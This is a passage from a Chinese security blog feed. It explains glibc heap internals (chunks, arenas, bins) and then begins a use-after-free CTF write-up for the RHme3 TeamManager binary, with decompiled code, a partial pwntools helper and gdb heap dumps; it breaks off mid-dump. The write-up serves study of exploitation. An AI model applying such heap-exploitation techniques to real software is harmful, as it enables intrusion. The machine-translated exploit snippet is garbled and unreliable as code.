class="line">使用 malloc 函数分配到的内存的返回值指针是指向 user data （用户数据区），在后面的例子中也会讲到这个问题。</span><br></pre></td></tr></table></figure><h3 id="0x0364位程序例子"><a href="#0x0364位程序例子" class="headerlink" title="0x0364位程序例子"></a>0x0364位程序例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">malloc(8)</span><br><span class="line">申请到的堆块总大小为16+8+8+1=0x21</span><br><span class="line">1.第一个 16 字节是系统最小分配的内存，也就是说你如果想要申请的内存小于系统最小分配的内存的话，就会按照最小的内存来分配。</span><br><span class="line"></span><br><span class="line">在 64 位系统中这个值是 16 个字节，在 32 位系统中是 8 个字节</span><br><span class="line">例如，如果代码中是 malloc(0) 的话，堆管理器也会分配最小内存空间给你</span><br><span class="line">2.第二个 8 字节是 pre size 字段的大小（32 位的为 4 字节）</span><br><span class="line">3.第三个 8 字节为 size 字段的大小（32 位的为 4 字节）</span><br><span class="line">4.最后一个 1 字节是 PREV_INUSE 的值，只有 0 或 1两个值</span><br></pre></td></tr></table></figure><h3 id="0x04指针和地址"><a href="#0x04指针和地址" class="headerlink" title="0x04指针和地址"></a>0x04指针和地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">熟练掌握指针的使用在堆的题目分析中还是很有帮助的。下面简单说一下堆分配中的指针会用到了地方。</span><br><span class="line">首先要明确用户在调用 malloc 函数时返回的值为一个指针，指向分配到堆空间（用户数据区），这个在最前面的那个图片也已经标出来了。</span><br><span class="line">有时候题目是以更复杂的情况，用指针来表示某个数据结构的</span><br><span class="line">first chunk（second chunk）表示第一和第二个结构，每个结构中都有一个 point_heap 指针来指向存储用户数据的堆块（chunk）。</span><br><span class="line">左边的这个本身就是一个堆块，用来存放一些全局信息。比如 max_size 存储了能够存储的最大结构数量；exist_num 表示已经存储的结构的数量。</span><br></pre></td></tr></table></figure><h3 id="0x05IDA中常见的指针表示形式"><a href="#0x05IDA中常见的指针表示形式" class="headerlink" title="0x05IDA中常见的指针表示形式"></a>0x05IDA中常见的指针表示形式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在 IDA 伪代码中的指针形式形如下面的情况：</span><br><span class="line">*(qword_6020A8 + 8)</span><br><span class="line">表示取到 qword_6020A8 这个地址加 8 偏移的那个地址存储的值</span><br><span class="line">汇编代码等同于：</span><br><span class="line">.text:0000000000400F85                 mov     rax, cs:qword_6020A8</span><br><span class="line">.text:0000000000400F8C                 mov     rax, [rax+8]</span><br><span class="line">简单转化一下，也就是：</span><br><span class="line">*(addr) = [addr]</span><br><span class="line">(qword_6020A8 + 16) 就*代表从 qword_6020A8 这个地址出再往后偏移 16 个字节，取到这个地址存储的值，接着把 1 赋值给这个地方（也就是把 1 存入这个地址）</span><br><span class="line">同样的 *(qword_6020A8 + 24) 就代表偏移 24 个字节处的值为 len</span><br><span class="line">依次类推就可以在不连续的内存空间中，把整个 note 的数据结构存储下来了。</span><br></pre></td></tr></table></figure><h3 id="0x06-申请堆块的本质"><a href="#0x06-申请堆块的本质" class="headerlink" title="0x06 申请堆块的本质"></a>0x06 申请堆块的本质</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">堆管理器 ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</span><br><span class="line">ptmalloc2 的作用通俗的讲就是相当于一个”中间商”，在程序想要申请向系统申请堆空间时，这里的 ptmalloc2 就会申请一块很大的空间，并根据算法从这些内存中把空间真正的分配给程序。</span><br><span class="line"></span><br><span class="line">简单的例子</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line"></span><br><span class="line">        char *p;</span><br><span class="line">        p = malloc(10);</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">在 gdb 中进行调试，在 call malloc 处下一个断点，在这里使用 vmmap 命令，查看内存分布。可以看到此时并没有发现堆段</span><br><span class="line">单步 n ，vmmap 命令再次查看内存，发现出现了堆段</span><br><span class="line">但是这里我们明明只是申请了 10 字节的大小，但是为什么这里的为什么给了这么大的堆段呢？</span><br><span class="line">0x00602000     ~    0x00623000</span><br><span class="line">计算一下，刚好是 132 kB</span><br><span class="line">(0x00623000-0x00602000)/1024 = 132 kB</span><br><span class="line">原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以这个区域叫做 main arena</span><br><span class="line">也就是说这 132 KB 是”厂家”（内核）批发给”中间商”（ptmalloc2）的货物，以便下次程序在向系统申请小内存的时候，直接去”中间商”去取就行了，他就会在这 132KB 中按照要申请”货物”的多少进行分配下去。若”中间商”缺货了话，ptmalloc2 就继续去找”厂家”（系统内核）去取货</span><br><span class="line"></span><br><span class="line">查看已分配的堆内存分布</span><br><span class="line">在上面我们动态调试的时候已经执行了 malloc 函数，申请到的堆指针是保存在 eax 中的</span><br><span class="line">我们这里使用下面这个命令来查看内存堆块情况：</span><br><span class="line">x/32gx 0x602010-0x10</span><br><span class="line">32位的程序使用 x/32xw 比较直观一点</span><br><span class="line">这里减去 0x10 表示从堆块的头部开始观察（包含 pre size 和 size 字段）</span><br></pre></td></tr></table></figure><h3 id="0x07-main-arena与top-chunk"><a href="#0x07-main-arena与top-chunk" class="headerlink" title="0x07 main_arena与top chunk"></a>0x07 main_arena与top chunk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">main_arena</span><br><span class="line">这个 main_arena 其实就是 ptmalloc2 堆管理器通过与操作系统内核进行交互申请到的，也就是相当于上面所说的”批发”到的一堆货物</span><br><span class="line">因为是主线程分配的，所以叫做main arena，通过增加 program break location 的方式来增加 main arena 的大小。</span><br><span class="line">使用 brk 方式扩展内存的方式这里就不说了，感兴趣可以自己去查一下资料</span><br><span class="line">参考 ctf-wiki：</span><br><span class="line">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview/#_4</span><br><span class="line">在 gdb 调试中，使用</span><br><span class="line">x/32gx &amp;main_arena</span><br><span class="line">可以看到 main_arena 的内存分配情况。</span><br><span class="line">top chunk</span><br><span class="line">顾名思义，是堆中第一个堆块。相当于一个”带头大哥”，程序以后分配到的内存到要放在他的后面。</span><br><span class="line">在系统当前的所有 free chunk(无论那种 bin)，都无法满足用户请求的内存大小的时候，将此 chunk 当做一个应急消防员，分配给用户使用。</span><br><span class="line">简单点说，也就是在程序在向堆管理器申请内存时，没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他</span><br></pre></td></tr></table></figure><h3 id="0x08-free函数和bins"><a href="#0x08-free函数和bins" class="headerlink" title="0x08 free函数和bins"></a>0x08 free函数和bins</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">bins 这个概念是与内存回收相关的，也就是堆管理器会根据用户已经申请到的内存空间大小进行释放，来决定放入哪类 bins 当作去。bins 直接翻译过来就是”垃圾桶”的意思，所以在系统在决定使用哪个 bins 时可以看作为”垃圾的分类”。</span><br><span class="line">主要的 bins 分为以下几类，这里重点讲解一下 fast bin，因为 fast bin 是使用到的最多的一类，也是其中结构最为简单的。</span><br><span class="line"></span><br><span class="line">free函数</span><br><span class="line">free 函数的使用是和 bins 的分配息息相关的。用一个简单的例子来理解一下 free 函数的实现原理。</span><br><span class="line">代码如下：</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line"></span><br><span class="line">        char *p;</span><br><span class="line"></span><br><span class="line">        p = malloc(10);</span><br><span class="line"></span><br><span class="line">        memcpy(p,&quot;Hello&quot;,5);</span><br><span class="line">        free(p);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line">程序将 “Hello” 字符串复制到申请到的堆内存空间中。</span><br><span class="line">编译后用 gdb 调试，在 call memcpy 处下一个断点，单步后将 “Hello” 复制到堆块中</span><br><span class="line">继续使用 x/32gx 0x602010-0x10 命令查看堆块情况</span><br><span class="line">继续单步 n，执行 free 函数之后，查看堆块情况</span><br><span class="line">这里可以看出原本堆块中存储的内容已经被清空，然后查看一下 main_arena 的值，发现其中 +0x8 的偏移处，存储了指向已经 free 了的指针（指向头部，而不是 user data）</span><br><span class="line">小总结</span><br><span class="line">所以调用 free 函数以后程序做了两件事：</span><br><span class="line">1.清空此堆块的 user data</span><br><span class="line">2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</span><br><span class="line"></span><br><span class="line">fast bin</span><br><span class="line">顾名思义，就是为了快速重新分配回内存而存在的一个结构。</span><br><span class="line">fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</span><br><span class="line"></span><br><span class="line">fast bin 的特性</span><br><span class="line"></span><br><span class="line">1.使用单链表来维护释放的堆块</span><br><span class="line">也就是和上图一样，从main_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。</span><br><span class="line"></span><br><span class="line">2.采用后进先出的方式维护链表（类似于栈的结构）</span><br><span class="line">当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，会选择后面新加入的堆块拿来先进行内存分配</span><br><span class="line"></span><br><span class="line">如上图，如果程序重新请求和上面的堆块大小一样时候（malloc），堆管理器就会直接使用 fast bin 里的堆块。</span><br><span class="line"></span><br><span class="line">这里的话也就是直接使用第二次释放的这个堆块，然后将这个堆块从链表中移除，接着根据堆块的 fk 指针找到这个堆块，此时 main_arena 就指向了这里。也就是恢复到了上面第一个图中的情况。</span><br><span class="line"></span><br><span class="line">small bin</span><br><span class="line">顾名思义，这个是一个 small chunk ，满足的内存空间比 fast bin 大一点。</span><br><span class="line">如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。</span><br><span class="line"></span><br><span class="line">unsorted bin</span><br><span class="line">当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</span><br><span class="line">unsorted bin 与 fast bin 不同，他使用双向链表对 chunk 进行连接</span><br><span class="line">unsorted 的字面意思就是”不可回收”的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个”垃圾桶”中。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文借鉴：&lt;a href=&quot;https://www.anquanke.com/post/id/163971&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/163971&lt;/a&gt;&lt;/p&gt;
&lt;h3
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>uaf实例</title>
    <link href="http://yoursite.com/2019/08/08/uaf%E5%AE%9E%E4%BE%8B/"/>
    <id>http://yoursite.com/2019/08/08/uaf实例/</id>
    <published>2019-08-08T08:01:52.559Z</published>
    <updated>2019-08-08T08:58:07.565Z</updated>
    
    <content type="html"><![CDATA[<p>RHme3 CTF 的一道题</p><h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE         </span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE</span><br><span class="line"></span><br><span class="line">堆的题目基本都是选择菜单，这里可以添加，删除，选择，编辑，展示球员，还可以显示队伍，</span><br><span class="line"></span><br><span class="line">Welcome to your TeamManager (TM)!</span><br><span class="line">0.- Exit</span><br><span class="line">1.- Add player</span><br><span class="line">2.- Remove player</span><br><span class="line">3.- Select player</span><br><span class="line">4.- Edit player</span><br><span class="line">5.- Show player</span><br><span class="line">6.- Show team</span><br><span class="line">Your choice:</span><br><span class="line"></span><br><span class="line">Your choice: 1</span><br><span class="line">Found free slot: 0</span><br><span class="line">Enter player name: 1</span><br><span class="line">Enter attack points: 1</span><br><span class="line">Enter defense points: 1</span><br><span class="line">Enter speed: 1</span><br><span class="line">Enter precision: 1</span><br><span class="line">上面就是球员这个结构有什么信息，第一个free slot就相当于球员的id，这个不用我们输入</span><br><span class="line"></span><br><span class="line">remove就删除咯</span><br><span class="line"></span><br><span class="line">Your choice: 2</span><br><span class="line">Enter index: 0</span><br><span class="line">She<span class="string">'s gone!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select会输出球员的信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your choice: 3</span></span><br><span class="line"><span class="string">Enter index: 0</span></span><br><span class="line"><span class="string">Player selected!</span></span><br><span class="line"><span class="string">    Name: 1</span></span><br><span class="line"><span class="string">    A/D/S/P: 1,1,1,1</span></span><br><span class="line"><span class="string">edit当前的palyer，基于上面的select</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your choice: 4</span></span><br><span class="line"><span class="string">0.- Go back</span></span><br><span class="line"><span class="string">1.- Edit name</span></span><br><span class="line"><span class="string">2.- Set attack points</span></span><br><span class="line"><span class="string">3.- Set defense points</span></span><br><span class="line"><span class="string">4.- Set speed</span></span><br><span class="line"><span class="string">5.- Set precision</span></span><br><span class="line"><span class="string">Your choice:</span></span><br><span class="line"><span class="string">show palyer，这个显示的是select的player</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your choice: 5</span></span><br><span class="line"><span class="string">    Name: 2</span></span><br><span class="line"><span class="string">    A/D/S/P: 1,1,1,1</span></span><br><span class="line"><span class="string">show team会将所有球员信息打印出来</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your choice: 6</span></span><br><span class="line"><span class="string">Your team: </span></span><br><span class="line"><span class="string">Player 0</span></span><br><span class="line"><span class="string">    Name: 2</span></span><br><span class="line"><span class="string">    A/D/S/P: 1,1,1,1</span></span><br><span class="line"><span class="string">Player 1</span></span><br><span class="line"><span class="string">    Name: 3</span></span><br><span class="line"><span class="string">    A/D/S/P: 3,3,3,3</span></span><br><span class="line"><span class="string">经过对add_player的逆向，可以推出palyer的结构</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct palyer&#123;</span></span><br><span class="line"><span class="string">    int attackPoint;</span></span><br><span class="line"><span class="string">    int defensePoints;</span></span><br><span class="line"><span class="string">    int speed;</span></span><br><span class="line"><span class="string">    int precision;</span></span><br><span class="line"><span class="string">    char* name;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">unsigned __int64 delete_player()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  void **ptr; // ST08_8</span></span><br><span class="line"><span class="string">  unsigned int v2; // [rsp+4h] [rbp-1Ch]</span></span><br><span class="line"><span class="string">  char nptr; // [rsp+10h] [rbp-10h]</span></span><br><span class="line"><span class="string">  unsigned __int64 v4; // [rsp+18h] [rbp-8h]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  v4 = __readfsqword(0x28u);</span></span><br><span class="line"><span class="string">  printf("Enter index: ");</span></span><br><span class="line"><span class="string">  fflush(stdout);</span></span><br><span class="line"><span class="string">  readline(&amp;nptr, 4LL);</span></span><br><span class="line"><span class="string">  v2 = atoi(&amp;nptr);</span></span><br><span class="line"><span class="string">  if ( v2 &lt;= 0xA &amp;&amp; players[v2] )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    ptr = (void **)players[v2];</span></span><br><span class="line"><span class="string">    players[v2] = 0LL;</span></span><br><span class="line"><span class="string">    free(ptr[2]);</span></span><br><span class="line"><span class="string">    free(ptr);</span></span><br><span class="line"><span class="string">    puts("She'</span>s gone!<span class="string">");</span></span><br><span class="line"><span class="string">    fflush(stdout);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    puts("</span>Invalid index<span class="string">");</span></span><br><span class="line"><span class="string">    fflush(stdout);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  return __readfsqword(0x28u) ^ v4;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uaf漏洞点</span></span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line">def  alloc（name，attack  =  1， </span><br><span class="line">   defense  =  2，speed  =  3，precision  =  4）：</span><br><span class="line"></span><br><span class="line">p.recvuntil（<span class="string">' choice：'</span>）</span><br><span class="line">p.sendline（<span class="string">' 1 '</span>）</span><br><span class="line"></span><br><span class="line">p.recvuntil（<span class="string">' name：'</span>）</span><br><span class="line">p.sendline（名称）</span><br><span class="line"></span><br><span class="line">p.recvuntil（<span class="string">' points：'</span>）</span><br><span class="line">p.sendline（str（attack））</span><br><span class="line"></span><br><span class="line">p.recvuntil（<span class="string">' points：'</span>）</span><br><span class="line">p.sendline（str（辩护））</span><br><span class="line"></span><br><span class="line">p.recvuntil（<span class="string">' speed：'</span>）</span><br><span class="line">p.sendline（str（speed））</span><br><span class="line"></span><br><span class="line">p.recvuntil（<span class="string">' precision：'</span>）</span><br><span class="line">p.sendline（str（precision））</span><br><span class="line"></span><br><span class="line">返回</span><br><span class="line"></span><br><span class="line">def  pwn（）：</span><br><span class="line"></span><br><span class="line">    alloc（<span class="string">' A '</span> * 0x 60）</span><br><span class="line">查看栈的情况</span><br><span class="line">(gdb) x/80gx 0x604000</span><br><span class="line">      0x604000:0x00000000000000000x0000000000000021 &lt;-- player 0 </span><br><span class="line">      0x604010:0x00000002000000010x0000000400000003</span><br><span class="line">      0x604020:0x00000000006040300x0000000000000071</span><br><span class="line">      0x604030:0x41414141414141410x4141414141414141</span><br><span class="line">      0x604040:0x41414141414141410x4141414141414141</span><br><span class="line">      0x604050:0x41414141414141410x4141414141414141</span><br><span class="line">      0x604060:0x41414141414141410x4141414141414141</span><br><span class="line">      0x604070:0x41414141414141410x4141414141414141</span><br><span class="line">      0x604080:0x41414141414141410x4141414141414141</span><br><span class="line">      0x604090:0x00000000000000000x0000000000020f71</span><br><span class="line"></span><br><span class="line">alloc（<span class="string">' B '</span> * 0x 60）</span><br><span class="line"></span><br><span class="line">(gdb) x/80gx 0x604000</span><br><span class="line">0x604000:0x00000000000000000x0000000000000021  &lt;-- player 0</span><br><span 